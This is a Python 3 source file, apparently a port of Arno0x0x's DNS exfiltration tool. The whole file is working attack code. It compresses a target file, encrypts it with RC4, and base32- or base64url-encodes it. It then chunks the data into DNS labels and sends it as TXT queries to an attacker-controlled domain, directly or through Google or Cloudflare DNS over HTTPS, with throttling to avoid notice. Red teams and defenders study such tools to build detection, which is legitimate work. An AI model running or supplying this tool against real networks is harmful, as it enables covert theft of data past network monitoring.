#!/usr/bin/env python3
"""
DNS Exfiltration Tool - Python 3 Implementation
Original Author: Arno0x0x, Twitter: @Arno0x0x
Converted to Python 3

Usage:
    python dnsExfiltrator.py <file> <domainName> <password> [options]
    
    Options:
        -b32                Use base32 encoding
        -h=<provider>       Use DoH (google or cloudflare)
        -s=<server>         DNS server IP
        -p=<port>           DNS server port (default: 53)
        -t=<ms>             Throttle time in milliseconds
        -r=<bytes>          Request max size (default: 255)
        -l=<chars>          Label max size (default: 63)
        --test              Test mode (show requests without sending)
"""

import sys
import os
import base64
import zipfile
import io
import time
import struct
import json
import urllib.request
import urllib.parse
from pathlib import Path

# For Windows DNS resolution
try:
    import dns.resolver
    HAS_DNSPYTHON = True
except ImportError:
    HAS_DNSPYTHON = False
    print("[!] Warning: dnspython not installed. Install with: pip install dnspython")


class Colors:
    """ANSI color codes for console output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'


def print_color(text):
    """Print colored text based on prefix"""
    if text.startswith("[!]"):
        print(f"{Colors.RED}{text}{Colors.RESET}")
    elif text.startswith("[+]"):
        print(f"{Colors.GREEN}{text}{Colors.RESET}")
    elif text.startswith("[*]"):
        print(f"{Colors.BLUE}{text}{Colors.RESET}")
    elif text.startswith("[?]"):
        print(f"{Colors.YELLOW}{text}{Colors.RESET}")
    else:
        print(text)


def print_usage():
    """Print usage information"""
    print("Usage:")
    print(f"    {sys.argv[0]} <file> <domainName> <password> [options]")
    print("\nMandatory arguments:")
    print("    file:        The file to be exfiltrated")
    print("    domainName:  The domain name for DNS requests")
    print("    password:    Password to encrypt the data")
    print("\nOptional arguments:")
    print("    -b32              Use base32 encoding")
    print("    -h=<provider>     Use DoH (google or cloudflare)")
    print("    -s=<server>       DNS server IP")
    print("    -p=<port>         DNS server port (default: 53)")
    print("    -t=<ms>           Throttle time in milliseconds")
    print("    -r=<bytes>        Request max size (default: 255)")
    print("    -l=<chars>        Label max size (default: 63)")
    print("    --test            Test mode (show requests without sending)")
    print("\nNote: You need a DNS server configured to receive these requests!")
    print("      The server must respond with TXT records containing 'OK' for init")
    print("      and the chunk number for data chunks.")


def rc4_encrypt(key, data):
    """RC4 encryption implementation"""
    key = bytes(key, 'utf-8') if isinstance(key, str) else key
    data = bytes(data) if not isinstance(data, bytes) else data
    
    # KSA (Key Scheduling Algorithm)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # PRGA (Pseudo-Random Generation Algorithm)
    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)
    
    return bytes(result)


def to_base64url(data):
    """Convert bytes to base64url encoding"""
    return base64.b64encode(data).decode('utf-8').replace('=', '').replace('/', '_').replace('+', '-')


def to_base32(data):
    """Convert bytes to base32 encoding"""
    return base64.b32encode(data).decode('utf-8').replace('=', '')


class DOHResolver:
    """DNS over HTTPS resolver"""
    
    GOOGLE_DOH = "https://dns.google.com/resolve"
    CLOUDFLARE_DOH = "https://cloudflare-dns.com/dns-query"
    
    @staticmethod
    def get_txt_record(provider, domain):
        """Query TXT record using DoH"""
        if provider == "google":
            url = f"{DOHResolver.GOOGLE_DOH}?name={domain}&type=TXT"
        elif provider == "cloudflare":
            url = f"{DOHResolver.CLOUDFLARE_DOH}?ct=application/dns-json&name={domain}&type=TXT"
        else:
            raise ValueError(f"Unknown DoH provider: {provider}")
        
        try:
            # Setup proxy if system has one configured
            proxy_handler = urllib.request.ProxyHandler()
            opener = urllib.request.build_opener(proxy_handler)
            urllib.request.install_opener(opener)
            
            with urllib.request.urlopen(url, timeout=10) as response:
                data = json.loads(response.read().decode('utf-8'))
                
                if 'Answer' in data and len(data['Answer']) > 0:
                    # Extract TXT record data, removing quotes
                    txt_data = data['Answer'][0]['data']
                    return txt_data.strip('"').replace('\\"', '')
                else:
                    raise Exception("DNS answer does not contain a TXT resource record")
        except Exception as e:
            raise Exception(f"DoH query failed: {str(e)}")


class DNSResolver:
    """Traditional DNS resolver using dnspython"""
    
    @staticmethod
    def get_txt_record(domain, dns_server=None, dns_port=53):
        """Query TXT record using standard DNS"""
        if not HAS_DNSPYTHON:
            raise Exception("dnspython is required. Install with: pip install dnspython")
        
        try:
            resolver = dns.resolver.Resolver()
            if dns_server:
                resolver.nameservers = [dns_server]
                resolver.port = dns_port
            
            # Increase timeout
            resolver.timeout = 10
            resolver.lifetime = 10
            
            answers = resolver.resolve(domain, 'TXT')
            if answers:
                # Return first TXT record, removing quotes
                return str(answers[0]).strip('"')
            else:
                raise Exception("No TXT records found")
        except dns.resolver.NXDOMAIN:
            raise Exception(f"Domain does not exist: {domain}")
        except dns.resolver.NoAnswer:
            raise Exception(f"No TXT record found for: {domain}")
        except dns.resolver.Timeout:
            raise Exception(f"DNS query timeout for: {domain}")
        except Exception as e:
            raise Exception(f"DNS query failed: {str(e)}")


def compress_file(file_path):
    """Compress file to ZIP in memory"""
    file_name = os.path.basename(file_path)
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.write(file_path, file_name)
    
    return zip_buffer.getvalue()


def main():
    """Main function"""
    # Check arguments
    if len(sys.argv) < 4:
        print_color("[!] Missing arguments")
        print_usage()
        sys.exit(1)
    
    # Mandatory parameters
    file_path = sys.argv[1]
    domain_name = sys.argv[2]
    password = sys.argv[3]
    
    # Optional parameters
    use_base32 = False
    use_doh = False
    doh_provider = None
    dns_server = None
    dns_port = 53
    throttle_time = 0
    request_max_size = 255
    label_max_size = 63
    test_mode = False
    
    # Parse optional arguments
    for arg in sys.argv[4:]:
        if arg == "-b32":
            use_base32 = True
        elif arg == "--test":
            test_mode = True
            print_color("[?] TEST MODE - Requests will be displayed but not sent")
        elif arg.startswith("-h="):
            provider = arg.split('=')[1]
            if provider in ["google", "cloudflare"]:
                doh_provider = provider
                use_doh = True
                if provider == "cloudflare":
                    use_base32 = True
                print_color("[*] Using DNS over HTTP for name resolution")
            else:
                print_color("[!] Invalid DoH provider. Use 'google' or 'cloudflare'")
                sys.exit(1)
        elif arg.startswith("-s="):
            dns_server = arg.split('=')[1]
            print_color(f"[*] Working with DNS server [{dns_server}]")
        elif arg.startswith("-p="):
            dns_port = int(arg.split('=')[1])
            print_color(f"[*] Using DNS port [{dns_port}]")
        elif arg.startswith("-t="):
            throttle_time = int(arg.split('=')[1])
            print_color(f"[*] Setting throttle time to [{throttle_time}] ms")
        elif arg.startswith("-r="):
            size = int(arg.split('=')[1])
            if size < 255:
                request_max_size = size
            print_color(f"[*] Setting DNS request max size to [{request_max_size}] bytes")
        elif arg.startswith("-l="):
            size = int(arg.split('=')[1])
            if size < 63:
                label_max_size = size
            print_color(f"[*] Setting label max size to [{label_max_size}] chars")
    
    # Check file exists
    if not os.path.exists(file_path):
        print_color(f"[!] File not found: {file_path}")
        sys.exit(1)
    
    file_name = os.path.basename(file_path)
    
    # Compress file
    print_color(f"[*] Compressing (ZIP) the [{file_path}] file in memory")
    zip_data = compress_file(file_path)
    
    # Encrypt
    print_color(f"[*] Encrypting the ZIP file with password [{password}]")
    encrypted_data = rc4_encrypt(password, zip_data)
    
    # Encode
    if use_base32:
        print_color("[*] Encoding the data with Base32")
        encoded_data = to_base32(encrypted_data)
    else:
        print_color("[*] Encoding the data with Base64URL")
        encoded_data = to_base64url(encrypted_data)
    
    print_color(f"[*] Total size of data to be transmitted: [{len(encoded_data)}] bytes")
    
    # Calculate chunk size
    bytes_left = request_max_size - 10 - (len(domain_name) + 2)
    nb_full_labels = bytes_left // (label_max_size + 1)
    smallest_label_size = bytes_left % (label_max_size + 1) - 1
    chunk_max_size = nb_full_labels * label_max_size + smallest_label_size
    nb_chunks = len(encoded_data) // chunk_max_size + 1
    
    print_color(f"[+] Maximum data exfiltrated per DNS request (chunk max size): [{chunk_max_size}] bytes")
    print_color(f"[+] Number of chunks: [{nb_chunks}]")
    
    # Send init request
    init_data = f"{file_name}|{nb_chunks}"
    init_encoded = to_base32(init_data.encode('utf-8'))
    
    if use_base32:
        init_request = f"init.{init_encoded}.base32.{domain_name}"
    else:
        init_request = f"init.{init_encoded}.base64.{domain_name}"
    
    print_color("[*] Sending 'init' request")
    print_color(f"[?] Init request: {init_request}")
    print_color(f"[?] Request length: {len(init_request)} bytes")
    
    if test_mode:
        print_color("[?] TEST MODE: Simulating 'OK' response")
        reply = "OK"
    else:
        try:
            if use_doh:
                reply = DOHResolver.get_txt_record(doh_provider, init_request)
            else:
                reply = DNSResolver.get_txt_record(init_request, dns_server, dns_port)
            
            if reply != "OK":
                print_color(f"[!] Unexpected answer for initialization request: [{reply}]")
                print_color("[!] Expected 'OK' from DNS server")
                sys.exit(1)
        except Exception as e:
            print_color(f"[!] Exception occurred: {str(e)}")
            print_color("[!] Make sure your DNS server is configured to handle these requests!")
            print_color("[!] The server must respond with TXT records.")
            print_color(f"[!] For testing, use: python {sys.argv[0]} {file_path} {domain_name} {password} --test")
            sys.exit(1)
    
    # Send data chunks
    print_color("[*] Sending data...")
    
    chunk_index = 0
    i = 0
    
    while i < len(encoded_data):
        # Get chunk
        chunk = encoded_data[i:i + chunk_max_size]
        chunk_length = len(chunk)
        
        # Build request
        request = f"{chunk_index}."
        
        # Split chunk into labels
        j = 0
        while j * label_max_size < chunk_length:
            label = chunk[j * label_max_size:min((j + 1) * label_max_size, chunk_length)]
            request += label + "."
            j += 1
        
        request += domain_name
        
        if test_mode:
            print_color(f"[?] Chunk {chunk_index}/{nb_chunks-1}: {request[:80]}..." if len(request) > 80 else f"[?] Chunk {chunk_index}/{nb_chunks-1}: {request}")
            print_color(f"[?] Request length: {len(request)} bytes")
            reply = str(chunk_index)
        else:
            # Send request
            a_retries = 1
            while a_retries > 0:
                try:
                    if use_doh:
                        reply = DOHResolver.get_txt_record(doh_provider, request)
                    else:
                        reply = DNSResolver.get_txt_record(request, dns_server, dns_port)
                    
                    count_ack = int(reply)
                    
                    if count_ack != chunk_index:
                        print_color(f"[!] Chunk number [{count_ack}] lost. Resending.")
                        continue
                    else:
                        print_color(f"[+] Chunk {chunk_index}/{nb_chunks-1} sent successfully")
                    a_retries = 0
                except Exception as e:
                    print_color(f"[!] Exception occurred: {str(e)}")
                    print_color(f"[!] Failed on chunk {chunk_index}")
                    #sys.exit(1)
        
        i += chunk_max_size
        chunk_index += 1
        
        # Apply throttle
        if throttle_time > 0:
            time.sleep(throttle_time / 1000.0)
    
    print_color("[*] DONE!")
    
    if test_mode:
        print_color("[?] This was a test run. No actual DNS queries were made.")
        print_color("[?] To actually send data, you need:")
        print_color("[?]   1. A DNS server that you control")
        print_color("[?]   2. The server must be configured to respond to these TXT queries")
        print_color("[?]   3. Run without --test flag")


if __name__ == "__main__":
    main()
